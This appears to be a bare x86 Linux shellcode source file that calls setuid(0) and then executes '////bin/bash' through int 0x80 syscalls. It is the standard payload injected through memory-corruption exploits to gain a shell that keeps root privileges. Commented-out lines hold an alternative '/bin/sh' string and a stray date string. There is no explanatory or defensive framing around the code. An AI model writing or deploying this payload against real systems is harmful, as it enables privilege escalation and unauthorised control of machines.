global _start

_start:
    xor eax,eax
    mov ebx,eax
    mov al,0x17
    int 0x80
    
    xor edx,edx
    push edx
    ; push dword 0x68732f6e ; hs/n
    ; push dword 0x69622f2f ; ib//
    push 0x68736162  ; hsab
    push 0x2f6e6962  ; nib/
    push 0x2f2f2f2f  ; ////
    mov ebx,esp
    push edx
    push ebx
    mov ecx,esp
    lea eax,[edx+0xb]
    int 0x80

    ; april 30
    ; push 0x3033206c ; 03 l
    ; push 0x69727041 ; irpA 